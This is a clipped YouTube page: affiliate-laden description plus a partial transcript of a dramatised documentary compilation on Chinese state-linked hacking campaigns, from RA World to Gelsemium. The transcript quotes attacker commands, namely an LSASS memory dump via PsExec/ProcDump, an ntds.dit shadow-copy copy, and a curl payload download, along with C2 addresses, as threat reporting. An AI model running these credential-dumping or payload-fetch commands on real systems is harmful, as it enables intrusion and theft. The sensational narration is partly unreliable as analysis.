---
title: "What's up with China's elite hacking?"
source: "https://www.youtube.com/watch?v=Iz1jB8uZ0xk"
author:
  - "[[Hacker Gallery]]"
published: 2025-06-20
created: 2026-05-05
description: "14 true stories and documentaries about Chinese hackers, explained easily. This is recent cyber security news turned into a compilation, including tales about China's military hackers, cyber criminals"
tags:
  - "clippings"
---
![](https://www.youtube.com/watch?v=Iz1jB8uZ0xk)

14 true stories and documentaries about Chinese hackers, explained easily. This is recent cyber security news turned into a compilation, including tales about China's military hackers, cyber criminals, elite adversaries, AKA 'advanced persistent threats', ransomware, malware tools, computer viruses, cryptocurrency thefts, state-sponsored foreign actors, technical deep dives and internet crime history. Watch the Operator explore unethical and black hat hacking for easy listening before sleeping, to fall asleep to, for education, awareness, or as background noise for anyone interested in cyber security as a hobby or a career...  
  
🛸Protect yourself online: https://go.getproton.me/SH1ZK  
👾 The password manager I use: https://go.getproton.me/SH1ZJ  
🦺 Switch to an encrypted email service: https://go.getproton.me/SH1ZL  
  
👉 Want to learn how to hack? https://bit.ly/42eUr5U  
  
🥷 VPN with malware & tracker blocking: https://affiliate.ipvanish.com/SHBG  
  
Join the Discord community: https://discord.com/invite/9gmHFSGbSD  
  
VIDEO CHAPTERS  
00:00 - For whom the bell tolls, it tolls for thee.  
09:26 - China's after the ultimate prize.  
18:11 - Elite military squad began their reconnaissance phase.  
27:11 - Right now, hackers are inside SSH daemons across the globe.  
36:39 - The trail led back to 2005.  
51:05 - For fifteen years, this malware has been evolving.  
01:03:15 - You know about China's Great Firewall, right?  
01:10:44 - Two names you need to know: FamousSparrow and Redfly.  
01:23:40 - You think you know cyber warfare? You don't know APT31.  
01:33:12 - We just found malware called ToughProgress.  
01:45:09 - This AI Phishing-as- a-Service platform runs 24/7.  
01:58:08 - You're potentially feeding data to Chinese intelligence servers.  
02:11:32 - Chinese botnets works like this.  
02:22:26 - A disabled account suddenly reactivates on a busy network.  
  
Disclaimer: The links above are from companies which Hacker Gallery will earn an affiliate commission or referral bonus.  
  
This video is based on my personal experience and should not be considered professional or legal advice. Always do your own research.  
  
#cybersecurity #documentary #entertainment

## Transcript

### For whom the bell tolls, it tolls for thee.

**0:15** · Last November, a software company in South Asia found a file on their network.

**0:20** · "Data breach warning.txt." Inside, a simple message.

**0:25** · Two million dollars. Pay up or watch your stolen data get sold to the highest bidder.

**0:31** · But this wasn't your typical ransomware extortion. The attack had fingerprints all over it. The kind you usually see in espionage operations. The kind that target governments, not corporate.

**0:44** · I'm talking about RA World. A ransomware group that emerged in April of twenty twenty-three using modified Babuk ransomware. You might remember Babuk. Their source code leaked back in twenty twenty-one, giving every wannabe cybercriminal a blueprint for extortion.

**1:01** · But RA World took it further. They weren't just encrypting files and demanding payment. They were using tools that belonged in a different league entirely. Tools that nation-states use to steal secrets and spy on enemies.

**1:14** · So why were espionage-grade weapons being used to rob companies?

**1:18** · Because what happened to that South Asian software company wasn't just another ransomware attack.

**1:23** · And if my intel is right, this story is just getting started.

**1:36** · RA Group disappeared. And in their place, RA World was born.

**1:42** · This wasn't just a rebrand. This was an evolution.

**1:45** · Activity spiked thirty-seven percent almost overnight. New techniques. New signatures.

**1:52** · They started leaving calling cards. A mutex name that read "for whom the bell tolls, it tolls for thee." Their encrypted files now carried the dot-RAWLD extension. Clean. Professional. Unmistakable. RA World was performing multi-extortion.

**2:08** · They'd steal your data first, then encrypt everything.

**2:12** · Calculate the cost per customer. Per record. Per piece of sensitive information.

**2:18** · Then they'd post samples on dark web leak sites. Public shaming with a price tag attached.

**2:23** · When encryption finished, they'd drop a file like this one shown here. C:\\Windows\\Help\\Finish.exe. Their signature. Their way of saying the job was done.

**2:32** · The scope was massive. Manufacturing companies across the United States.

**2:37** · Healthcare organizations in Latin America. Critical infrastructure in Europe and Asia.

**2:43** · But investigators noticed something troubling about RA Worlds toolkit.

**2:48** · You see, their same tools were being found in other attacks. And that tool i’m talking about, well… I'm talking about PlugX.

**2:57** · China’s remote access trojan that's been in the wild since two thousand and eight. It has everything you need to own a network completely. Not only that, but they used the NPS proxy tool.

**3:09** · China-developed software for secret network communication.

**3:13** · The kind of thing you use when you need to hide your tracks across international lines.

**3:18** · Everything was leading up to this moment. That’s when Palo Alto Networks Unit 42 made a startling connection. They attributed with low confidence the ransomware group RA World to Emperor Dragonfly. Also known as Bronze Starlight. Now, when intelligence analysts say they assess something with "low confidence," that doesn't mean they're guessing.

**3:45** · Bronze Starlight has been active since mid-twenty twenty-one. State-sponsored.

**3:50** · China-linked. They use something called HUI Loader to deploy Cobalt Strike and PlugX.

**3:57** · Professional espionage operations targeting intellectual property theft.

**4:01** · But Bronze Starlight has a history of deploying ransomware as a smokescreen for espionage. They steal secrets, then burn the place down to cover their tracks.

**4:12** · So the question investigators were asking wasn't whether state actors were involved.

**4:18** · The question was whether state-sponsored hackers were moonlighting for profit.

**4:24** · Because if that's true, then I'm horrified at what's to come in our lifetimes… Here's what I think is happening. State-backed operatives might be moonlighting for profit. Government hackers. Trained by nation-states. Using taxpayer-funded tools and techniques. Working side gigs for personal cash.

**4:53** · It sounds crazy until you look at that November attack in South Asia.

**4:57** · The attackers didn't just use crappy phishing emails. They exploited CVE-2024-0012. An authentication bypass vulnerability in Palo Alto PAN-OS with a CVSS score of 9.3.

**5:13** · That's a critical flaw, that's the kind of zero-day exploitation you see in advanced persistent threat campaigns. If the management web interface was exposed to the internet, an unauthenticated attacker could gain administrator privileges. Complete control.

**5:30** · No username. No password. No security questions. Just walk right in.

**5:37** · So once they were inside, they used DLL sideloading. A technique that's become a signature of Chinese espionage groups. They dropped toshdpdb\[.\]exe. A legitimate Toshiba executable. Then they paired it with a malicious DLL called toshdpapi\[.\]dll.

**5:54** · The legitimate executable loads the malicious DLL. Windows thinks everything's fine because the executable is signed and trusted. And that DLL? It deployed PlugX. The same remote access trojan used in government espionage campaigns across Southeast Europe and Asia.

**6:21** · When I break down the technical details, you'll understand why your company's security might not be prepared for what's coming. The attackers used Stage1\[.\]exe to hit the network first. It performed domain checks. Made sure Exclude\[.\]exe was present. Then it would add Stage2\[.\]exe to the SYSVOL shared path. Stage2\[.\]exe was where things got interesting.

**6:44** · It enabled safe mode for evasion. Your security tools? They can't see what's happening in safe mode. Then it used AES decryption based on the victim's domain name. Custom encryption keys for each target.

**7:01** · Stage3\[.\]exe delivered the final payload. Modified Babuk ransomware.

**7:08** · But before they encrypted anything, they went hunting for credentials.

**7:12** · They used PsExec and ProcDump to dump memory from the LSASS process.

**7:19** · The command looked like this: "psexec\[.\]exe \\\\<target> -accepteula -s procdump\[.\]exe -accepteula -ma lsass\[.\]exe lsass\[.\]dmp" That's your Windows authentication secrets.

**7:25** · Every password hash. Every Kerberos ticket. Everything they needed to move laterally through the network. Then they used Impacket. A legitimate penetration testing toolkit. The command they used is shown here. "cmd\[.\]exe /Q /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds\[.\]dit \[redacted\]\[.\]dit" They copied the entire Active Directory database. Every user account. Every permission. The complete blueprint of your network architecture. When they finally deployed the ransomware, they used Curve25519 and HC-128 encryption. Military-grade cryptography.

**8:03** · But the code had spelling mistakes. "Runing" instead of "running." Clearly non-native English speakers. And the timestamps? Everything pointed to GMT plus seven to GMT plus nine time zones. Asia, specifically.

**8:21** · Most corporate security teams have never seen anything like this. They're prepared for phishing emails and basic malware.

**8:30** · They're not prepared for nation-states to rob them blind.

**8:40** · So where does this leave us? That "low confidence" assessment from Palo Alto Networks Unit 42 isn't the end of the story.

**8:48** · File path similarities that can't be coincidental. RA World used C:\\Windows\\Help\\Windows\\ContentStore\\\[redacted\]\_update\[.\]exe.

**8:56** · Bronze Starlight operations? C:\\Windows\\Help\\mui\\0409\\WindowsUpdate\[.\]exe.

**8:58** · Similar directories. Similar naming conventions. If this moonlighting hypothesis is true, if state-sponsored hackers are really working side gigs for personal profit, then we're witnessing the birth of a completely new threat.

**9:09** · The true extent of state-actor involvement in ransomware operations remains unclear. We’re still trying to put the pieces together. Still investigating.

### China's after the ultimate prize.

**9:36** · Your company probably trusts SentinelOne to protect its computers. Millions of businesses do.

**9:42** · Sentinel One sits at the heart of America's networks. I mean a lot of them. They protect hospitals, power plants, government agencies. Their software watches for threats on endpoints across critical infrastructure.

**9:52** · Here's the thing about being the protector. You become the ultimate prize.

**9:58** · Think about it. If you're a nation-state hacker, why attack a hundred companies individually when you could target the one company defending all of them?

**10:06** · That's exactly what Chinese state-sponsored actors figured out. They looked at SentinelOne and saw something beautiful. A single point of failure that could unlock thousands of downstream targets.

**10:18** · SentinelOne built their reputation on artificial intelligence and behavioral detection. They promised to catch the attacks other tools missed. Their platform sits on millions of endpoints, watching, learning, protecting. But when you're that important, that connected, that trusted - you paint a target on your back that's visible from Beijing.

**10:38** · What happened next would test everything SentinelOne claimed about their defenses.

**10:47** · Three months earlier, something happened in South Asia that nobody connected to SentinelOne.

**10:53** · A government entity got breached. Standard Tuesday for cybersecurity professionals. Another alert, another investigation, another cleanup. But this wasn't standard.

**11:06** · The attackers left behind something called ShadowPad malware. This thing was built to be invisible. It had a sixty-second delay hardcoded into its PowerShell execution.

**11:16** · Why sixty seconds? Because that's how long most automated security sandboxes run their analysis. The malware literally waits for the sandbox to give up and move on.

**11:29** · Then it executes the code shown here. \`sleep 60;curl.exe -o c:\\programdata\\AppSov.EXE\` The password they used to lock their 7-Zip archives was identified. \`@WsxCFt6&amp;UJMmko0\`.

**11:35** · I know that seems random, but remember it. You'll see it again.

**11:39** · The malware connected back to the following site at this IP address. 45\[.\]13\[.\]199\[.\]209/rss/rss.php. On the surface, it looked like an RSS feed. Underneath, it was a command and control server. They paired ShadowPad with something called Nimbo-C2. This is an open-source remote access framework that anyone can download from GitHub.

**11:59** · Nimbo-C2 gave them everything they needed. Screenshots of the victim's desktop. File upload and download capabilities. UAC bypass to gain administrative privileges.

**12:12** · The attackers were methodical. They hunted for specific file types: Excel spreadsheets, text documents, certificates, private keys. Anything with file extensions like these ones. .xls, .xlsx, .ods, .txt, .pem, .cert, .pfx. They used ScatterBrain to obfuscate ShadowPad's code. Layer after layer of encryption and misdirection.

**12:30** · The South Asian breach looked like espionage. Clean, professional, state-sponsored.

**12:35** · But it was actually reconnaissance. The first step towards attacking SentinelOne.

**12:48** · Early 2025. The Chinese hackers made their move. But not the way anyone expected.

**12:55** · They didn't go after SentinelOne directly. That would be too obvious. Too defended.

**13:01** · Instead, they went after the IT services company that managed SentinelOne's hardware.

**13:06** · Supply chain attacks are the ultimate hack. Why break down the front door when you can steal the keys from the maintenance guy? The attackers deployed the same toolkit they'd perfected over months. ShadowPad malware. Nimbo-C2 framework. That same password: \`@WsxCFt6&amp;UJMmko0\`.

**13:27** · But they added a new twist. After exfiltrating data, the malware triggered a thirty-minute reboot cycle. This was the destruction of evidence by clearing the machine's memory.

**13:38** · SentinelOne's security team spotted the breach in their supplier's network. Alerts started firing. Investigators mobilized. They found PowerShell scripts hunting for sensitive documents. Same command structure as the South Asian breach months earlier.

**13:54** · Same file types targeted. Same approach. Despite the supplier breach, SentinelOne's own software and hardware remained clean. Their defenses held. The attackers never penetrated the actual target. But that wasn't the end of the story. It was just the beginning of understanding how big this really was.

**14:14** · While investigators focused on SentinelOne, the global scope became clear. The Chinese hackers hadn't put all their eggs in one basket. Over seventy organizations had been compromised worldwide. Factory floors in Germany. Government agencies in Australia. Financial institutions across Europe. Telecommunications companies. Research facilities. IT service providers.

**14:40** · The SentinelOne attack was one piece of a massive, coordinated global operation.

**14:50** · As investigators dug deeper into the seventy compromised organizations, patterns started emerging. The same IP address kept appearing. 142\[.\]93\[.\]214\[.\]219. This server showed up in the South Asian government breach. The SentinelOne supply chain attack. Multiple European targets. Even something called downloads.trendav\[.\]vip resolved to this exact address.

**15:18** · What looked like separate incidents were actually coordinated moves in a single, massive operation.

**15:24** · But the Chinese hackers had done something clever. They weren't just using their own custom tools anymore. They started adopting publicly available hacker tools from communities like The Hacker's Choice. They go by THC and they’ve been around forever - they make network penetration tools that anyone can download.

**15:41** · The attackers grabbed dsniff version 2.5a1. Network sniffing software that's decades old. They also used modified versions of something called clear13 - log removal tools designed to erase evidence. But they didn't just delete logs.

**15:57** · They manipulated timestamps. Made attacks look like they happened at different times.

**16:02** · Investigators would think they were looking at multiple incidents when it was actually one coordinated campaign. This is called timestomping. It's forensic misdirection at the highest level. The real innovation was something called Operational Relay Box networks. ORB infrastructure.

**16:21** · These weren't just compromised computers. The Chinese hackers had taken over network edge devices. Routers, firewalls, IoT hardware. The kind of equipment that sits at the boundary between networks. The ORB network was dynamic. Constantly shifting. IP addresses would change. Command and control servers would move. Just when investigators thought they had a handle on the infrastructure, everything would relocate.

**16:46** · Intelligence analysts eventually connected this to something called the PurpleHaze cluster.

**16:52** · And PurpleHaze linked directly to APT15 - one of China's most sophisticated state-sponsored units.

**16:58** · The use of open-source tools wasn't laziness. It was probably for confusion.

**17:03** · When nation-state hackers use the same tools as script kiddies, attribution becomes a nightmare.

**17:13** · As investigators finished their reports, the ORB network remained active. Command and control servers like dscriy.chtq\[.\]net and updata.dsqurey\[.\]com still accepting connections from compromised devices around the world.

**17:27** · The infrastructure was too dynamic to fully map. Too distributed to completely shut down.

**17:32** · The attackers had built something that could evolve faster than defenders could respond.

**17:37** · SentinelOne survived the ultimate test. They proved their technology worked even when nation-state hackers came for them directly. But when your cybersecurity vendor becomes the target, everyone downstream becomes vulnerable. There are many governments using SentinelOne for their network security. Seventy organizations learned that lesson the hard way. The rest of us got to watch and wonder when our turn comes.

**18:02** · Strongly recommend you check out Proton in the description below to keep yourself safe. If you want to learn to hack, check out our partners at Hack Academy.

### Elite military squad began their reconnaissance phase.

**18:29** · January 2025. The cybersecurity researchers at Cisco Talos are staring at their monitors, watching something they've never seen before unfold in real time.

**18:40** · Cisco Talos - that's one of the world's premier threat intelligence teams - they spend their days hunting for the worst kinds of predators. On this particular day, they caught something big. A threat actor they designated UAT-6382 was exploiting something called CVE-2025-0994.

**19:05** · It’s essentially a critical flaw in software - think of it as a back door that shouldn't exist.

**19:11** · But what they didn’t realise at the time was the target wasn't some Fortune 500 company or a major bank. It was Cityworks - software that manages the infrastructure you interact with every single day. The attackers had found a way to execute their own code remotely on these systems. But this wasn't just another ransomware gang looking for a quick payday. This was something far worse.

**19:48** · CVE-2025-0994 is what's called a deserialization vulnerability.

**19:58** · In simple terms, it's a flaw in how web applications process data.

**20:02** · The vulnerability lets attackers inject their own code that gets executed with full system privileges. The attackers had found a way to trick these servers into running whatever commands they wanted.

**20:13** · UAT-6382 began their reconnaissance phase. They started typing commands directly into these city servers. \`cmd.exe /c ipconfig\` - they wanted to see the network configuration. \`cmd.exe /c pwd\` - checking what directory they landed in. \`cmd.exe /c dir\` - listing all the files they could access. \`cmd.exe /c tasklist\` - seeing what programs were running. They were fingerprinting these servers, learning everything they could about the systems they'd just compromised.

**20:41** · The target folder they kept hitting was \`c:\\inetpub\\wwwroot\\CityworksServer\\WebSite\\Assets\` - the heart of the Cityworks application.

**20:46** · They started deploying web shells - these are essentially backdoors. The tools they used had names like AntSword, Behinder, and something called chinatso/Chopper.

**20:57** · Every single one of these tools contained messaging written in Chinese.

**21:00** · That should have been the first red flag that this wasn't your typical cybercriminal operation.

**21:07** · They built their own weapons. UAT-6382 started downloading custom malware using PowerShell commands. The files came from this IP address 192\[.\]210\[.\]239\[.\]172 on port 3219.

**21:19** · LVLWPH.exe, MCUCAT.exe, TJPLYT.exe, and z44.exe - random-looking names hiding sophisticated malware.

**21:28** · But the worst to come was something called TetraLoader.

**21:32** · TetraLoader was built in Rust - a programming language known for creating extremely efficient and hard-to-detect malware. It was based on something called the MaLoader framework. MaLoader had first appeared on GitHub in December 2024, just weeks before this attack. The entire framework was written in Simplified Chinese. The attackers had taken this openly available framework and weaponized it for their own purposes. TetraLoader's job was simple but deadly effective.

**22:06** · It would decode and inject malicious payloads into completely innocent processes.

**22:12** · They specifically targeted notepad.exe - that basic text editor that comes with every Windows computer. Nobody suspects notepad of being malicious. It's the perfect hiding spot.

**22:28** · This technique is called process injection, and it's exactly what it sounds like.

**22:35** · But this was just the beginning of what they had planned.

**22:39** · UAT-6382 expressed a clear interest in pivoting to systems related to utilities management.

**22:48** · Not financial data. Not personal information. Utilities management.

**22:54** · They wanted access to the systems that control water, power, and infrastructure.

**22:59** · They deployed Cobalt Strike beacons - these are advanced command and control tools.

**23:04** · The configuration was precise: sleep timers set between 25 and 45 seconds with 30 to 37 percent jitter. That means the malware would phone home every 25 to 45 seconds, but with random variations to avoid detection patterns.

**23:22** · The command and control server was this one, cdn\[.\]lgaircon\[.\]xyz, disguised to look like a content delivery network serving JavaScript.

**23:30** · The path was \`/jquery-3.3.1.min.js\` - made to look like a completely normal web resource.

**23:33** · They also used something called VShell for their command and control panels.

**23:37** · These interfaces were primarily displayed in Chinese, requiring operators who could read and write Chinese fluently. It was built by and for Chinese hackers.

**23:50** · They were staging files for exfiltration using commands like \`cmd.exe /c copy c:\\inetpub\\wwwroot\\CityworksServer\\<backup\_archives>\`. Why were they so interested in your water and power systems?

**24:08** · Everything pointed to a sophisticated Chinese operation.

**24:11** · Every group has their preferred methods, their favorite tools, their unique ways of operating. And UAT-6382's signature was unmistakably Chinese.

**24:24** · This was reconnaissance on a massive scale. The kind of intelligence gathering that happens before something much bigger. This was the work of a nation-state with significant cyber capabilities and unlimited resources.

**24:49** · The alarm bells started ringing in Washington. February 7, 2025. The U.S. Cybersecurity and Infrastructure Security Agency added CVE-2025-0994 to their catalog of actively exploited vulnerabilities. The Known Exploited Vulnerabilities Catalog isn't just a list - it's crucial for survival. But UAT-6382 had already been inside systems for weeks. Four days later, February 11, CISA released an urgent advisory.

**25:22** · Water and wastewater systems, energy, transportation systems, government services and facilities, and communications. All on critical alert.

**25:36** · Trimble, the company that makes Cityworks, had released security updates to address the vulnerability. They'd found the flaw and patched it. But patches only protect you going forward - they can't undo what's already happened. But UAT-6382 likely moved to new infrastructure after their discovery. That's standard operating procedure for sophisticated threat actors.

**26:05** · Once your tools and infrastructure get burned, you abandon them and build new ones.

**26:09** · So how many systems had they already got into before anyone noticed?

**26:24** · The next time you turn on your water or flip a light switch, remember that foreign adversaries spent months studying exactly how those services reach your home.

**26:33** · This was a nation-state conducting intelligence gathering on America's most critical systems. They invested months of planning, custom malware development, and operational security to achieve their goals. This wasn't the end of UAT-6382's campaign against American infrastructure. This was the reconnaissance phase.

**26:58** · They've mapped the targets, identified the vulnerabilities, and proven they can penetrate these systems undetected. Now they're planning their next move.

### Right now, hackers are inside SSH daemons across the globe.

**27:14** · Right now, hackers are inside network appliances across the globe.

**27:18** · We're talking about an active campaign that started in mid-November 2024. It's still running today. The target? SSH daemons. These are the secure remote access points that administrators use to manage firewalls, routers, and network switches. Every major organization has them. You probably have one.

**27:39** · Here's what makes this different. Fortinet's researchers just dropped a bombshell. They said something that should make every cybersecurity professional uncomfortable.

**27:49** · "Although it has been documented previously, no analytical reports exist on how it works."

**27:55** · Think about that. We know this attack exists. But no one can explain how they're pulling it off.

**28:00** · SSH stands for Secure Shell. It's supposed to be the gold standard for remote network administration. When you connect to a server or network device remotely, SSH encrypts everything. Your keystrokes, your commands, your data. It's designed to be bulletproof.

**28:23** · But this group found a way to inject their own code directly into the SSH daemon itself.

**28:29** · The attribution leads to a cyber-espionage group called Evasive Panda.

**28:33** · They've been operating since at least 2012. That's thirteen years of attacks across mainland China, Hong Kong, Macao, Nigeria, and throughout Southeast and East Asia.

**28:44** · Thirteen years. And we're just now understanding what they're really doing.

**28:54** · Three years ago, Google's Threat Analysis Group found something called Macma malware targeting macOS systems. Professional-grade stuff. The kind of malware that takes serious resources to develop. Only problem is, they couldn't connect it to anyone. No attribution. After all that analysis.

**29:17** · What Google didn't know was that they were looking at the tip of an iceberg.

**29:21** · This group had been operating for nearly a decade already. Nine years of staying invisible while building something bigger. The aliases started piling up. DaggerFly.

**29:33** · StormBamboo. StormCloud. Bronze Highland. Multiple names for what investigators suspected was the same threat actor. Instead of attacking you directly, they compromised the trusted channels you use to update your software. When your application checks for updates, it gets malware instead. Your system installs it willingly because it thinks it's legitimate. Then they escalated.

**29:59** · They then attacked Tencent QQ, the messaging app used by hundreds of millions of people.

**30:05** · But this wasn't about messaging. They were hunting international NGOs using the platform.

**30:11** · Months later, something happened that should terrify all of you. We observed them compromising an entire internet service provider. An ISP controls the highways that connect your devices to the internet. When you type a website address, your request goes through their servers first. When applications tried to update themselves, the ISP's compromised servers redirected them to malicious downloads instead. The researchers described it as happening "without requiring user interaction."

**30:45** · No clicking on suspicious links. No opening email attachments.

**30:50** · When these applications went to retrieve their updates, instead of installing the intended update, they would install malware, including but not limited to MACMA and POCOSTICK.

**31:00** · The ISP quickly took notice and then rebooted their network infrastructure.

**31:04** · Maybe it was routine maintenance. Maybe they actually detected problems.

**31:08** · But as soon as they did that, the DNS poisoning immediately stopped.

**31:12** · Just like that. The attack vanished when the ISP's systems restarted. Which tells you the attackers had figured out how to maintain persistence in active memory without leaving permanent traces.

**31:28** · That’s so wild. But they weren't done. While the ISP attack was making headlines, they were simultaneously running a completely different operation.

**31:39** · Four months inside a large U.S. organization with significant business presence in China.

**31:44** · Four months undetected. Now before we look at this attack, you need to know that the hackers assigned distinct roles in each of the breached machines and followed a structured approach that allowed them to persist and gather intelligence.

**31:59** · Distinct roles for each machine. Exactly like a military operation with specialized units. Because they are one. The first signs appeared as suspicious WMI commands. Registry dumps. PowerShell scripts querying Active Directory for user accounts and group information. They were mapping the organization's identity infrastructure. Finding out who had access to what.

**32:26** · Weeks later, they had pivoted to additional systems. Using renamed versions of FileZilla, PowerShell scripts, WinRAR for compression, PSCP for secure file transfers. All legitimate tools turned into weapons.

**32:42** · Instead of bringing custom malware that antivirus might detect, they abuse tools that are supposed to be there. That technique is called "living off the land."

**32:53** · Anyway, they eventually they infected a fifth machine using called DLL sideloading. They placed a malicious library next to iTunes Helper and let Windows load their code automatically.

**33:07** · But their real target was the Exchange servers. Those are the email systems.

**33:13** · They were also using something called Kerberoasting. This exploits how Windows handles authentication. They requested service tickets for user accounts, then took those encrypted tickets offline to crack them with brute force attacks. Can you imagine how much patience this requires?

**33:32** · Four months of very precise and careful movement. The initial infection vector? It remains unknown.

**33:40** · Even after months of forensic analysis, researchers couldn't figure out how they got in initially. A formidable threat indeed. By now, they were building toward something bigger. Something that would challenge our understanding of SSH.

**33:58** · Researchers had to use AI to analyse this attack. And they found something that connects all of Evasive Panda's attacks across different platforms.

**34:06** · A custom framework. Shared code that runs on Windows, macOS, Linux, and Android systems.

**34:15** · This framework includes threat management, synchronization tools, event notifications, timers, data processing, and platform-independent abstractions.

**34:26** · Everything you'd need to build a cross-platform cyber-espionage operation.

**34:30** · The identifying markers are two magic strings: "inp" and "tim." Like fingerprints left in the code.

**34:36** · Since it is not available in any public repositories, there’s nothing else it could be other than a custom framework used exclusively by them.

**34:44** · They're still out there. The SSH daemon injection campaign continues as we speak.

**34:49** · That should make you uncomfortable. Because if thirteen years of attacks and cutting-edge AI analysis can't stop them, what will? That’s anyone's guess.

**35:03** · Here's what makes this threat different from anything we've seen before.

**35:06** · After thirteen years of operations, their custom framework remains completely exclusive to them.

**35:12** · No public repositories. No underground markets. No leaked source code. No copycats.

**35:19** · Most malware frameworks get stolen, sold, or reverse engineered within months. Not this one.

**35:25** · Their arsenal goes beyond what we've discussed. Trojanized Android APKs.

**35:30** · SMS interception tools. DNS request manipulation. They even have malware targeting obscure Solaris systems that most people forgot existed. But right now, they're focused on network appliances. Firewalls, routers, switches. The infrastructure that every organization depends on.

**35:50** · Think about your organization's network. How many SSH connections do you have running right now? How many network appliances with remote management capabilities?

**36:00** · Every single one represents a potential entry point.

**36:04** · The SSH daemon looks normal. Functions normally. Passes security scans.

**36:10** · But underneath, it's reporting back to them. System details. Password hashes. User activity.

**36:18** · Everything flowing through your network infrastructure.

**36:21** · The researchers who finally discovered their SSH injection technique had to use artificial intelligence just to understand what they were looking at.

**36:28** · So here's the question that should keep you awake tonight.

**36:31** · When was the last time you checked your SSH daemons?

**36:35** · We’ve got an even crazier story coming right up, so don’t go anywhere.

### The trail led back to 2005.

**36:50** · Last year, something unusual appeared on VirusTotal.

**36:53** · Linux malware samples. Uploaded from Taiwan. Then the Philippines. Then Singapore.

**37:01** · This wasn't your typical Linux threat. The name alone told you everything you needed to know about the attackers' intentions. WolfsBane.

**37:10** · I've been tracking cybercrime for years. Most Linux malware is basic. Crypto miners. Simple backdoors. Script kiddie stuff. But WolfsBane was different.

**37:23** · Just by looking at the logs I instantly knew this was APT malware. It’s immediately obvious. Logos show WolfsBane has got multiple components. It does a lot of things when it gets onto your system. It’s a program with elite accuracy. It has a dropper masquerading as 'cron.'

**37:45** · A launcher disguised as a KDE desktop component called 'kde.'

**37:49** · The main backdoor hiding behind the name was called 'udevd' - mimicking a legitimate Linux device manager.

**37:58** · And underneath it all, a modified version of the BEURK userland rootkit. Customized to be cruel.

**38:06** · The Chinese hackers behind it were observed abandoning their Windows variant and moving to Linux. Why?

**38:12** · We’ll get to that, but for now, just remember what you're about to discover will change how you think about Linux security. Because this story doesn't start in 2025.

**38:24** · It starts almost two decades ago. And it's still happening right now.

**38:34** · When researchers started analyzing WolfsBane, they found something unexpected.

**38:40** · Code signatures. Technical fingerprints. Genetic markers pointing to something much older.

**38:47** · This wasn't a new threat group trying to break into Linux.

**38:50** · This was an old adversary bringing decades of experience to a new battlefield.

**38:56** · The trail led back to 2005. Project Wood.

**39:00** · A simple espionage tool. Basic by today's standards. It could collect system data, log keystrokes, take screenshots. Nothing fancy. Nothing sophisticated.

**39:13** · But it was the beginning. By 2012, the operators had refined their methods. They discovered CVE-2012-0158. A vulnerability in Office documents that let them embed malicious objects. When someone opened the file, code executed automatically.

**39:32** · The group used spear-phishing emails with malicious attachments exploiting CVE-2012-0158.

**39:39** · Government workers. University researchers. High-value targets across East Asia and the Middle East. The delivered malware included early versions of what would become Gelsevirine. Precursors to the sophisticated tools they'd develop later.

**39:55** · Then 2014 arrived. And the threat group got a name.

**40:00** · Gelsemium. Operation TooHash launched across the region. Same targets. Same methods. But with increasing sophistication.

**40:09** · Governments fell. Universities were compromised. Intellectual property vanished into the void.

**40:16** · And all of it traced back to that simple espionage tool from 2005.

**40:20** · But the real surprise was still coming. Because Gelsemium wasn't done evolving.

**40:32** · By 2018, Gelsemium had outgrown simple phishing emails.

**40:37** · They wanted bigger targets. More persistent access. Complete control.

**40:42** · So they changed tactics entirely. Watering hole attacks. They compromised internal servers at organizations, turning legitimate websites into malware distribution points.

**40:55** · Anyone who visited got infected automatically. Exchange server exploits followed. Unpatched servers became entry points for web shell deployment. Once inside, they had persistent remote access to entire networks. But the real evolution was in their malware architecture. They shared malware with Blackwood, another group that emerged in 2018, using the NSPX30 implant, which evolved from 'Project Wood' and DCM, or “Dark Specter”, first seen in 2008.

**41:32** · Blackwood targeted entities in China, Japan, and the UK, delivering NSPX30 via AitM attacks since at least 2018. NSPX30 wasn't just a backdoor anymore.

**41:46** · It was a complete infection framework. A dropper that bypassed User Account Control.

**41:51** · A loader. An orchestrator. A modular backdoor with plugins for everything.

**41:57** · Files. Screenshots. Keystrokes. Hardware data. Credentials. Chat logs from Tencent QQ.

**42:05** · They could collect anything. From anyone. At any time.

**42:08** · Their command and control infrastructure became impossible to track. Dynamic DNS constantly changed their domains. Asidomain\[.\]com was just one of dozens rotating through their network.

**42:21** · But Gelsemium was still thinking bigger. Why break into systems when you could hijack the software people already trust? So that’s exactly what they did.

**42:32** · WPS Office updates. Tencent QQ.

**42:36** · Sogou Pinyin input software. None of them were spared.

**42:41** · Millions of users installing what they thought were legitimate updates.

**42:44** · Actually getting malware. Tencent QQ had hundreds of millions of users. WPS Office was Microsoft Office's biggest competitor in Asia.

**42:55** · And they were all compromised. But nobody noticed. The updates worked normally. The software functioned as expected. Users had no idea their systems were compromised.

**43:07** · That's when you know you're dealing with professionals.

**43:14** · Then September 2020 arrived. And Gelsemium did something nobody expected.

**43:19** · They went after gamers. Operation NightScout. Target: NoxPlayer.

**43:25** · An Android emulator. Software that lets you run mobile games on your PC. Popular with gamers who wanted bigger screens. Better controls. Enhanced performance.

**43:39** · One hundred fifty million users worldwide. APT groups don't usually target gaming communities. What military intelligence would they get? Not sure, but Gelsemium did it anyway.

**43:51** · Between September 2020 and January 2021, they compromised NoxPlayer's update mechanism.

**43:59** · Anyone updating their emulator could receive malware instead of legitimate software patches.

**44:04** · The supply-chain attack leveraged the emulator's update channel, indicating a highly targeted operation. The malware was Gelsemine. A sophisticated backdoor delivered through what users thought was routine software maintenance.

**44:20** · Taiwan. Hong Kong. Sri Lanka. Gaming communities across the region had no idea they were being targeted by one of the most persistent APT groups in the world.

**44:33** · One hundred fifty million people. Gamers. Regular users just trying to play Clash of Clans or PUBG Mobile on their computers.

**44:42** · Remember that the next time you go updating your stuff. Same routine you've done heaps of times. The update downloads. Installs. Everything looks normal.

**44:52** · But buried inside is malware from an elite chinese hacking squad that's been operating since 2005.

**45:04** · The Linux malware samples appearing on VirusTotal weren't random.

**45:08** · They were evidence of a strategic decision eighteen years in the making.

**45:12** · Gelsemium was abandoning Windows. A threat group that had perfected Windows exploitation for nearly two decades. Suddenly switching platforms entirely.

**45:24** · Why? The answer was staring security teams in the face. Endpoint detection and response tools had become too good. Microsoft had disabled VBA macros by default. The old Windows attack methods weren't working anymore.

**45:39** · So Gelsemium adapted. Enter WolfsBane. A sophisticated Linux backdoor that represented everything they'd learned about stealth and persistence. Translated to a new operating system. But WolfsBane wasn't alone.

